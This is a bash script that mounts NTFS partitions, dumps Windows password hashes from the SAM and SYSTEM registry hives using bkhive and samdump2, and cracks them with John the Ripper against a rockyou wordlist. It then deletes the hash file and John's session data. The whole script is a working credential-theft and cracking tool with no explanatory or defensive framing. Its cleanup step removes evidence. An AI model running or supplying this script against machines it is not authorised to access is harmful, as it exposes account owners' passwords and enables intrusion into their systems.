#!/bin/bash

function dumpfrommount {
    if [ -e "$1/Windows/System32/config/SAM" ]; then
        bkhive "$1/Windows/System32/config/SYSTEM" /tmp/systemkeyfile.txt &> /dev/null
        samdump2 "$1/Windows/System32/config/SAM" /tmp/systemkeyfile.txt 2> /dev/null | tee -a hashes.txt
        rm /tmp/systemkeyfile.txt
    fi
}

for curdrive in `fdisk -l | grep NTFS | grep -o -E '^/[^ ]+'`; do
    curmountpoint=`grep $curdrive /proc/mounts | cut -d ' ' -f 2`
    curmountpoint=`printf "$curmountpoint"`
    if [ -z "$curmountpoint" ]; then
        mkdir /tmp/tmpmount
        mount -r "$curdrive" /tmp/tmpmount
        dumpfrommount "/tmp/tmpmount"
        umount "$curdrive"
        rmdir /tmp/tmpmount
    else
        dumpfrommount "$curmountpoint"
    fi
done

john --wordlist=rockyou-top-1m.txt --format=nt hashes.txt 2>&1 | grep '('
rm hashes.txt
rm -r ~/.john/
